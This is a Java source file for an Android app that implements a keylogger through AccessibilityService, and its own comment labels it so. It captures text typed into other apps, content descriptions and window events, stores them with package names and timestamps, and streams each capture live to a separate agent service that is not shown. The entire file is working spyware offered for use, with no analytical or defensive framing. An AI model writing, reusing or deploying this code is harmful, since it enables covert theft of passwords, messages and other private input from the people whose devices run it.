package ai.m4zk1play.spy;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

/** Keylogger via AccessibilityService. */
public class KeylogService extends AccessibilityService {

    private static final int MAX = 2000;
    private static final List<String> BUF = new ArrayList<>();
    private static KeylogService live;

    @Override public void onServiceConnected() { live = this; }
    @Override public void onInterrupt() { }
    @Override public void onDestroy() { if (live == this) live = null; super.onDestroy(); }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent ev) {
        if (ev == null) return;
        try {
            int type = ev.getEventType();
            String pkg = ev.getPackageName() == null ? "" : ev.getPackageName().toString();
            if (pkg.startsWith("ai.m4zk1play")) return;

            String text = "";
            if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && ev.getText() != null) {
                for (CharSequence c : ev.getText()) text = text + c;
            } else if (ev.getContentDescription() != null) {
                text = ev.getContentDescription().toString();
            } else if (ev.getText() != null && ev.getText().length() > 0) {
                text = String.valueOf(ev.getText().get(0));
            }
            if (text.isEmpty() && type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;

            JSONObject o = new JSONObject();
            o.put("pkg", pkg);
            o.put("type", type);
            o.put("text", text);
            o.put("ts", System.currentTimeMillis());
            String line = o.toString();

            synchronized (BUF) {
                BUF.add(line);
                while (BUF.size() > MAX) BUF.remove(0);
            }
            if (AgentService.instance != null) AgentService.instance.pushLive("keylog", line);
        } catch (Exception ignored) {
        }
    }

    public static List<String> drain() {
        synchronized (BUF) {
            List<String> copy = new ArrayList<>(BUF);
            BUF.clear();
            return copy;
        }
    }

    public static boolean alive() { return live != null; }
}
